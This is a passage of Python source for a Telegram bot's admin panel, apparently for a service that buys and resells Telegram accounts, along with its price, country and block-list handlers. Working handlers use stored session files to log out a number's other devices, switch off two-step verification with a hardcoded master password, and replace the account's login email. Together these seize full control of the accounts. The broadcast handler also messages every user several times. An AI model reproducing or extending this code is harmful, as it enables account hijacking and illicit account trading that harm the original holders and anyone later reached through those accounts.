        f"Select a number to manage:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def admin_login_number_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show devices/sessions for a specific number + management options."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    try:
        _, phone_part = query.data.split('|', 1)
    except ValueError:
        await query.answer("Invalid request.", show_alert=True)
        return

    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, f"sell_{phone_part}")
    display = '+' + phone_part.replace(' ', '')

    if not os.path.exists(session_path + '.session'):
        await query.answer("Session not found.", show_alert=True)
        await admin_login_list_callback(update, context)
        return

    keyboard = []
    devices_text = "_Could not fetch devices._"

    import shutil, tempfile
    # Use a temporary copy of the session to avoid SQLite "database is locked"
    tmp_dir = tempfile.mkdtemp()
    tmp_session = os.path.join(tmp_dir, "tmp_sess")
    try:
        shutil.copy2(session_path + '.session', tmp_session + '.session')
        client = TelegramClient(tmp_session, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        result = await client(functions.account.GetAuthorizationsRequest())
        await client.disconnect()

        auths = result.authorizations
        device_lines = []
        for auth in auths:
            device_name = auth.device_model or "Unknown"
            platform = auth.platform or ""
            app = auth.app_name or ""
            is_current = getattr(auth, 'current', False)
            label = f"{'📍 ' if is_current else '📱 '}{device_name} ({platform}) — {app}"
            if not is_current:
                h = str(auth.hash)
                keyboard.append([InlineKeyboardButton(
                    f"🚫 Logout: {device_name[:22]}",
                    callback_data=f"admin_login_dev_out|{phone_part}|{h}",
                )])
            device_lines.append(label)

        total = len(auths)
        non_current = total - sum(1 for a in auths if getattr(a, 'current', False))
        devices_text = (
            f"📊 মোট সেশন: *{total}টি* (অন্য ডিভাইস: *{non_current}টি*)\n\n" +
            "\n".join(device_lines)
        ) if device_lines else "_কোনো সেশন পাওয়া যায়নি।_"
    except Exception as e:
        logger.error(f"[Login Mgmt] Failed to get auths for {display}: {e}")
        devices_text = f"⚠️ ডিভাইস লোড করা যায়নি: {e}"
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    keyboard.append([InlineKeyboardButton("🔓 2FA Off", callback_data=f"admin_2fa_off|{phone_part}")])
    keyboard.append([InlineKeyboardButton("📧 Email Change", callback_data=f"admin_email_change|{phone_part}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_login_list")])

    await query.edit_message_text(
        f"🔐 *Login Management*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 Number: `{display}`\n\n"
        f"*Active Sessions/Devices:*\n{devices_text}\n\n"
        f"_ডিভাইস লগআউট করতে নিচের বাটনে চাপুন।_",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def admin_login_device_logout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Logout a specific device/session for a number."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    try:
        parts = query.data.split('|', 2)
        _, phone_part, auth_hash_str = parts
        auth_hash = int(auth_hash_str)
    except (ValueError, IndexError):
        await query.answer("Invalid request.", show_alert=True)
        return

    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, f"sell_{phone_part}")
    display = '+' + phone_part.replace(' ', '')

    status = "✅ ডিভাইস সফলভাবে লগআউট হয়েছে।"
    import shutil, tempfile
    tmp_dir4 = tempfile.mkdtemp()
    tmp_sess4 = os.path.join(tmp_dir4, "tmp_dev_out")
    try:
        shutil.copy2(session_path + '.session', tmp_sess4 + '.session')
        client = TelegramClient(tmp_sess4, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        await client(functions.account.ResetAuthorizationRequest(hash=auth_hash))
        await client.disconnect()
    except Exception as e:
        logger.error(f"[Login Mgmt] Device logout failed for {display}: {e}")
        status = f"⚠️ Error: {e}"
    finally:
        shutil.rmtree(tmp_dir4, ignore_errors=True)

    keyboard = [
        [InlineKeyboardButton("🔙 Back to Number", callback_data=f"admin_login_num|{phone_part}")],
        [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")],
    ]
    await query.edit_message_text(
        f"🚫 *Device Logout Result*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 Number: `{display}`\n\n{status}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


TWO_FA_MASTER_PASSWORD = "4735908767"


async def admin_2fa_off_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Disable 2FA using the master password (4735908767) — no input needed."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    try:
        _, phone_part = query.data.split('|', 1)
    except ValueError:
        await query.answer("Invalid request.", show_alert=True)
        return

    display = '+' + phone_part.replace(' ', '')
    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, f"sell_{phone_part}")

    await query.edit_message_text(
        f"🔓 *2FA Off*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 Number: `{display}`\n\n"
        f"⏳ 2FA বন্ধ করা হচ্ছে...",
        parse_mode='Markdown',
    )

    status = "✅ 2FA সফলভাবে বন্ধ হয়ে গেছে।"
    import shutil, tempfile
    tmp_dir = tempfile.mkdtemp()
    tmp_session = os.path.join(tmp_dir, "tmp_2fa")
    try:
        shutil.copy2(session_path + '.session', tmp_session + '.session')
        client = TelegramClient(tmp_session, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        pwd_info = await client(functions.account.GetPasswordRequest())
        if not pwd_info.has_password:
            status = "ℹ️ এই নাম্বারে 2FA আগে থেকেই বন্ধ আছে।"
        else:
            await client.edit_2fa(current_password=TWO_FA_MASTER_PASSWORD, new_password=None)
            status = "✅ 2FA সফলভাবে বন্ধ হয়ে গেছে।"
        await client.disconnect()
    except Exception as e:
        logger.error(f"[2FA Off] Failed for {display}: {e}")
        err_str = str(e)
        if 'PASSWORD_HASH_INVALID' in err_str or 'HASH_INVALID' in err_str:
            status = "❌ Master password কাজ করেনি। এই নাম্বারের 2FA password ভিন্ন।"
        else:
            status = f"⚠️ Error: {err_str}"
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    keyboard = [
        [InlineKeyboardButton("🔙 Back to Number", callback_data=f"admin_login_num|{phone_part}")],
        [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")],
    ]
    await query.edit_message_text(
        f"🔓 *2FA Off Result*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 Number: `{display}`\n\n{status}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def handle_admin_2fa_off_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Legacy handler — kept for compatibility but no longer used."""
    context.user_data.pop('admin_2fa_off_target', None)
    # No-op: 2FA is now handled directly with master password
    if not update.message:
        return
    keyboard = [[InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")]]
    await update.message.reply_text(
        "ℹ️ 2FA Off এখন automatic — password টাইপ করতে হয় না।",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )




async def admin_email_change_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Prompt admin to enter new email for a number."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    try:
        _, phone_part = query.data.split('|', 1)
    except ValueError:
        await query.answer("Invalid request.", show_alert=True)
        return

    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, f"sell_{phone_part}")
    display = '+' + phone_part.replace(' ', '')

    current_email_info = "_(Could not fetch)_"
    import shutil, tempfile
    tmp_dir2 = tempfile.mkdtemp()
    tmp_sess2 = os.path.join(tmp_dir2, "tmp_email_r")
    try:
        shutil.copy2(session_path + '.session', tmp_sess2 + '.session')
        client = TelegramClient(tmp_sess2, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        pwd_info = await client(functions.account.GetPasswordRequest())
        await client.disconnect()
        if hasattr(pwd_info, 'email_unconfirmed_pattern') and pwd_info.email_unconfirmed_pattern:
            current_email_info = f"`{pwd_info.email_unconfirmed_pattern}` _(unconfirmed)_"
        else:
            current_email_info = "_(No recovery email set)_"
    except Exception as e:
        logger.error(f"[Email Change] Get email info failed for {display}: {e}")
    finally:
        shutil.rmtree(tmp_dir2, ignore_errors=True)

    context.user_data['admin_email_change_target'] = phone_part

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data=f"admin_login_num|{phone_part}")]]
    await query.edit_message_text(
        f"📧 *Email Change*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📞 Number: `{display}`\n"
        f"📧 Current Email: {current_email_info}\n\n"
        f"Please type the *new email address* to set:\n"
        f"Example: `example@gmail.com`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown',
    )


async def handle_admin_email_change_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Step 1: Admin typed new email — send verification code to that email via Telegram Login Email API."""
    if not update.message or not update.message.text:
        return

    phone_part = context.user_data.pop('admin_email_change_target', None)
    if not phone_part:
        return

    new_email = update.message.text.strip()
    display = '+' + phone_part.replace(' ', '')

    if '@' not in new_email or '.' not in new_email.split('@')[-1]:
        await update.message.reply_text(
            "❌ *Invalid email format.* Valid email দিন।",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
        )
        return

    import shutil, tempfile
    from telethon.tl.functions.account import SendVerifyEmailCodeRequest
    from telethon.tl.types import EmailVerifyPurposeLoginChange

    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, f"sell_{phone_part}")
    tmp_dir = tempfile.mkdtemp()
    tmp_sess = os.path.join(tmp_dir, "tmp_email_step1")
    client = None
    try:
        shutil.copy2(session_path + '.session', tmp_sess + '.session')
        client = TelegramClient(tmp_sess, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        await client(SendVerifyEmailCodeRequest(
            purpose=EmailVerifyPurposeLoginChange(),
            email=new_email,
        ))
        await client.disconnect()
        client = None

        # Store state for step 2
        context.user_data['admin_email_verify_target'] = phone_part
        context.user_data['admin_email_verify_email'] = new_email

        # Delete admin's typed email message
        try:
            await update.message.delete()
        except Exception:
            pass

        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data=f"admin_login_num|{phone_part}")]]
        verify_msg = await update.effective_chat.send_message(
            f"📧 *Email Verification*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 Number: `{display}`\n"
            f"📧 New Email: `{new_email}`\n\n"
            f"✉️ `{new_email}` এ একটি verification code পাঠানো হয়েছে।\n\n"
            f"📌 এখন সেই code টি এখানে টাইপ করুন:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown',
        )
        context.user_data['admin_email_verify_msg_id'] = verify_msg.message_id
    except Exception as e:
        logger.error(f"[Email Change Step1] Failed for {display}: {e}")
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Number", callback_data=f"admin_login_num|{phone_part}")],
            [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")],
        ]
        await update.message.reply_text(
            f"❌ *Error sending verification code*\n\n"
            f"📞 Number: `{display}`\n\n"
            f"⚠️ {e}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown',
        )
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        shutil.rmtree(tmp_dir, ignore_errors=True)


async def handle_admin_email_verify_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Step 2: Admin typed verification code — confirm the Login Email change."""
    if not update.message or not update.message.text:
        return

    phone_part = context.user_data.pop('admin_email_verify_target', None)
    new_email = context.user_data.pop('admin_email_verify_email', None)
    verify_msg_id = context.user_data.pop('admin_email_verify_msg_id', None)
    if not phone_part or not new_email:
        return

    code = update.message.text.strip()
    display = '+' + phone_part.replace(' ', '')

    # Delete admin's typed code message and the verification prompt
    try:
        await update.message.delete()
    except Exception:
        pass
    if verify_msg_id:
        try:
            await update.effective_chat.delete_message(verify_msg_id)
        except Exception:
            pass

    import shutil, tempfile
    from telethon.tl.functions.account import VerifyEmailRequest
    from telethon.tl.types import EmailVerifyPurposeLoginChange, EmailVerificationCode

    sessions_dir = 'sessions'
    session_path = os.path.join(sessions_dir, f"sell_{phone_part}")
    tmp_dir = tempfile.mkdtemp()
    tmp_sess = os.path.join(tmp_dir, "tmp_email_step2")
    client = None
    try:
        shutil.copy2(session_path + '.session', tmp_sess + '.session')
        client = TelegramClient(tmp_sess, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        await client(VerifyEmailRequest(
            purpose=EmailVerifyPurposeLoginChange(),
            verification=EmailVerificationCode(code=code),
        ))
        await client.disconnect()
        client = None

        keyboard = [
            [InlineKeyboardButton("🔙 Back to Number", callback_data=f"admin_login_num|{phone_part}")],
            [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")],
        ]
        await update.effective_chat.send_message(
            f"✅ *Login Email সফলভাবে পরিবর্তন হয়েছে!*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 Number: `{display}`\n"
            f"📧 New Login Email: `{new_email}`",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown',
        )
    except Exception as e:
        logger.error(f"[Email Change Step2] Failed for {display}: {e}")
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Number", callback_data=f"admin_login_num|{phone_part}")],
            [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")],
        ]
        await update.effective_chat.send_message(
            f"❌ *Email পরিবর্তন হয়নি*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 Number: `{display}`\n\n"
            f"⚠️ {e}\n\n"
            f"💡 Code ভুল হলে আবার চেষ্টা করুন।",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown',
        )
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        shutil.rmtree(tmp_dir, ignore_errors=True)


async def admin_block_number_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Prompt admin for a phone number to block."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    context.user_data.clear()
    context.user_data['admin_block_number'] = True

    text = (
        "🚫 *Block Number*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Please send the phone number you want to *block*.\n\n"
        "Format: `+8801XXXXXXXXX` (with country code)\n\n"
        "Once blocked, this number will no longer be able to submit any messages or sell requests to the bot."
    )
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def admin_unblock_number_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Prompt admin for a phone number to unblock."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    context.user_data.clear()
    context.user_data['admin_unblock_number'] = True

    text = (
        "✅ *Unblock Number*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Please send the phone number you want to *unblock*.\n\n"
        "Format: `+8801XXXXXXXXX` (with country code)\n\n"
        "After unblocking, this number will be able to use the bot again."
    )
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def admin_blocked_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the full list of blocked numbers."""
    query = update.callback_query
    await query.answer()

    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    if not blocked_numbers:
        text = (
            "📜 *Blocked Numbers*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "_No numbers are currently blocked._"
        )
    else:
        sorted_nums = sorted(blocked_numbers)
        listing = "\n".join(f"`{i}.` `{n}`" for i, n in enumerate(sorted_nums, 1))
        text = (
            "📜 *Blocked Numbers*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"*Total blocked:* {len(sorted_nums)}\n\n"
            f"{listing}"
        )
    keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def handle_admin_block_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add the supplied phone number to the blocked list."""
    text = update.message.text.strip() if update.message and update.message.text else ""
    context.user_data.pop('admin_block_number', None)

    number = normalize_phone(text)
    if not number or len(number) < 6 or not number[1:].isdigit():
        await update.message.reply_text(
            "❌ *Invalid number format.*\n\nPlease provide a valid phone number with the country code (e.g. `+8801XXXXXXXXX`).",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
        )
        return

    if number in blocked_numbers:
        msg = f"ℹ️ Number `{number}` is *already blocked*."
    else:
        blocked_numbers.add(number)
        save_blocked_numbers()
        msg = (
            f"🚫 *Number Blocked Successfully*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 Number: `{number}`\n\n"
            f"This number can no longer send any messages or sell requests to the bot."
        )

    await update.message.reply_text(
        msg,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
    )


async def handle_admin_unblock_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Remove the supplied phone number from the blocked list."""
    text = update.message.text.strip() if update.message and update.message.text else ""
    context.user_data.pop('admin_unblock_number', None)

    number = normalize_phone(text)
    if not number or len(number) < 6 or not number[1:].isdigit():
        await update.message.reply_text(
            "❌ *Invalid number format.*\n\nPlease provide a valid phone number with the country code (e.g. `+8801XXXXXXXXX`).",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
        )
        return

    if number not in blocked_numbers:
        msg = f"ℹ️ Number `{number}` is *not in the blocked list*."
    else:
        blocked_numbers.discard(number)
        save_blocked_numbers()
        msg = (
            f"✅ *Number Unblocked Successfully*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 Number: `{number}`\n\n"
            f"This number can use the bot again."
        )

    await update.message.reply_text(
        msg,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
    )


async def admin_bot_status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle bot ON/OFF status changes"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        return

    action = query.data.replace('admin_bot_', '')
    is_active = (action == 'on')
    
    withdrawal_settings['bot_active'] = is_active
    save_withdrawal_settings()

    status_msg = "✅ **Bot has been turned ON!**" if is_active else "❌ **Bot has been turned OFF!**"
    
    # Send notification to all users
    notification_text = ""
    if is_active:
        notification_text = "✨ **System Update** ✨\n\n✅ The bot is now **ONLINE** and ready to process your requests! 🚀\n\nThank you for your patience."
        count = 5
    else:
        notification_text = "⚠️ **Maintenance Alert** ⚠️\n\n🔴 The bot is currently **OFFLINE** for maintenance and upgrades. 🛠️\n\nWe will notify you once we are back online. Sorry for any inconvenience!"
        count = 3

    # Send multiple notifications as requested
    for user_id_key in user_data.keys():
        try:
            for _ in range(count):
                await context.bot.send_message(chat_id=user_id_key, text=notification_text, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to notify user {user_id_key}: {e}")

    await admin_panel_callback(update, context)

async def admin_sell_price_control_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin sell price control callback with pagination"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    # Pagination logic
    items_per_page = 90
    try:
        # Extract page number from callback data like admin_sell_price_control_page_1
        data_parts = query.data.split('_')
        page = int(data_parts[-1]) if "page" in data_parts else 0
    except:
        page = 0
        
    start_idx = page * items_per_page
    end_idx = start_idx + items_per_page

    all_keys = sorted(COUNTRIES_DATA.keys(), key=lambda x: COUNTRIES_DATA[x]['sell_price'], reverse=True)
    page_keys = all_keys[start_idx:end_idx]

    price_control_text = f"💸 **Sell Account Price Control (Page {page+1})**\n\nSelect a country to change its sell price:"

    keyboard = []
    # Create keyboard with 2 countries per row
    for i in range(0, len(page_keys), 2):
        row = []
        c1 = page_keys[i]
        name1 = COUNTRIES_DATA[c1]['name']
        row.append(InlineKeyboardButton(f"{name1} ${COUNTRIES_DATA[c1]['sell_price']}", callback_data=f"admin_edit_sell_{c1}"))
        
        if i + 1 < len(page_keys):
            c2 = page_keys[i+1]
            name2 = COUNTRIES_DATA[c2]['name']
            row.append(InlineKeyboardButton(f"{name2} ${COUNTRIES_DATA[c2]['sell_price']}", callback_data=f"admin_edit_sell_{c2}"))
        keyboard.append(row)

    # Navigation buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"admin_sell_price_control_page_{page-1}"))
    if end_idx < len(all_keys):
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"admin_sell_price_control_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)

    # Add "Add New Country" button
    keyboard.append([InlineKeyboardButton("🆕 Add New Country", callback_data="admin_add_new_country")])
    
    # Add back button
    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(price_control_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_edit_sell_price_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin edit sell price for specific country"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    # Extract country key from callback data: admin_edit_sell_{country_key}
    country_key = query.data.split('_', 3)[3]

    if country_key not in COUNTRIES_DATA:
        await query.edit_message_text("❌ Country data not found!")
        return

    country_data = COUNTRIES_DATA[country_key]
    current_price = country_data['sell_price']

    edit_price_text = f"""
💰 **Edit Sell Price**

🌍 **Country:** {country_data['name']}
💵 **Current Sell Price:** ${current_price} USD

Enter new sell price (USD):

Example: 1.50
"""

    # Set context for price change
    context.user_data['price_control_country'] = country_key
    context.user_data['price_control_type'] = 'sell'
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Price Control", callback_data="admin_sell_price_control")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(edit_price_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_add_new_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin add new country"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    add_country_text = """
🆕 **Add New Country**

Write the country name with flag emoji:

Examples:
• Bangladesh 🇧🇩
• Pakistan 🇵🇰  
• Nepal 🇳🇵
• Sweden 🇸🇪

Please enter country name with flag:
"""

    # Set context for new country
    context.user_data['admin_add_new_country'] = True
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Price Control", callback_data="admin_sell_price_control")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(add_country_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_delete_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin delete country - show all countries"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    delete_country_text = """
🗑️ **Delete Country**

Select a country to delete:

⚠️ Warning: This will permanently remove the country from the sell list!
"""

    # Get all countries sorted by sell price (descending for better visibility)
    all_countries = list(COUNTRIES_DATA.keys())
    all_countries.sort(key=lambda x: COUNTRIES_DATA[x]['sell_price'], reverse=True)

    # Create keyboard with 2 countries per row
    keyboard = []
    # Maximum countries to show per page to avoid "Message is too long" or keyboard size limits
    # Telegram allows max 100 buttons per message
    MAX_COUNTRIES = 90
    display_countries = all_countries[:MAX_COUNTRIES]
    
    for i in range(0, len(display_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(display_countries):
                country_key = display_countries[i + j]
                if country_key in COUNTRIES_DATA:
                    country_data = COUNTRIES_DATA[country_key]
                    sell_price = country_data['sell_price']
                    name = country_data['name']
                    if len(name) > 15:
                        name = name[:12] + "..."
                    button_text = f"{name} ${sell_price}"
                    row.append(InlineKeyboardButton(button_text, callback_data=f"admin_del_country_{country_key}"))
        if row:
            keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(delete_country_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_confirm_delete_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin confirm delete country - delete and stay on same page"""
    query = update.callback_query

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    # Extract country key from callback data: admin_del_country_{country_key}
    country_key = query.data.replace('admin_del_country_', '')

    if country_key not in COUNTRIES_DATA:
        await query.answer("❌ Country not found!", show_alert=True)
        return

    country_data = COUNTRIES_DATA[country_key]
    country_name = country_data['name']

    # Delete the country
    del COUNTRIES_DATA[country_key]
    save_countries_data()

    # Show confirmation as popup
    await query.answer(f"✅ {country_name} deleted!", show_alert=False)

    # Refresh the delete country page with updated list
    delete_country_text = f"""
🗑️ **Delete Country**

✅ **Deleted:** {country_name}

Select another country to delete:

⚠️ Warning: This will permanently remove the country from the sell list!
"""

    # Get all countries sorted by sell price (descending for better visibility)
    all_countries = list(COUNTRIES_DATA.keys())
    all_countries.sort(key=lambda x: COUNTRIES_DATA[x]['sell_price'], reverse=True)

    # Create keyboard with 2 countries per row
    keyboard = []
    for i in range(0, len(all_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(all_countries):
                ck = all_countries[i + j]
                if ck in COUNTRIES_DATA:
                    cd = COUNTRIES_DATA[ck]
                    sell_price = cd['sell_price']
                    name = cd['name']
                    if len(name) > 15:
                        name = name[:12] + "..."
                    button_text = f"{name} ${sell_price}"
                    row.append(InlineKeyboardButton(button_text, callback_data=f"admin_del_country_{ck}"))
        if row:
            keyboard.append(row)

    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(delete_country_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_new_country_name_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin new country name input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    country_name = update.message.text.strip()
    
    # Validate input
    if len(country_name) > 50 or len(country_name) < 3:
        await update.message.reply_text("❌ Country name must be between 3-50 characters!")
        return

    # Store country name and ask for price
    context.user_data['new_country_name'] = country_name
    
    price_request_text = f"""
💰 **Set Sell Price**

🌍 **Country:** {country_name}

Enter the sell price for this country (USD):

Example: 1.50

Note: Buy price will be automatically calculated as 30% higher.
"""

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_sell_price_control")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(price_request_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_new_country_price_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin new country price input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    country_name = context.user_data.get('new_country_name')
    if not country_name:
        await update.message.reply_text("❌ Country name not found!")
        return

    try:
        price_input = update.message.text.strip()
        sell_price = float(price_input)
        
        # Validate price range
        if sell_price <= 0:
            await update.message.reply_text("❌ Price must be greater than zero!")
            return
        if sell_price > 1000:
            await update.message.reply_text("❌ Price cannot exceed $1000 USD!")
            return
        if len(price_input.split('.')) > 1 and len(price_input.split('.')[1]) > 2:
            await update.message.reply_text("❌ Price can have maximum 2 decimal places!")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number! Example: 1.50")
        return

    # Create new country key
    new_country_key = country_name.lower().replace(' ', '_').replace('🇧🇩', '').replace('🇵🇰', '').replace('🇮🇳', '').replace('🇺🇸', '').replace('🇬🇧', '').strip()
    
    # Calculate buy price (30% higher)
    buy_price = round(sell_price * 1.3, 2)
    
    # Add to COUNTRIES_DATA
    COUNTRIES_DATA[new_country_key] = {
        'name': country_name,
        'sell_price': sell_price,
        'buy_price': buy_price
    }
    save_countries_data()

    success_text = f"""
✅ **New Country Added Successfully!**

🌍 **Country:** {country_name}
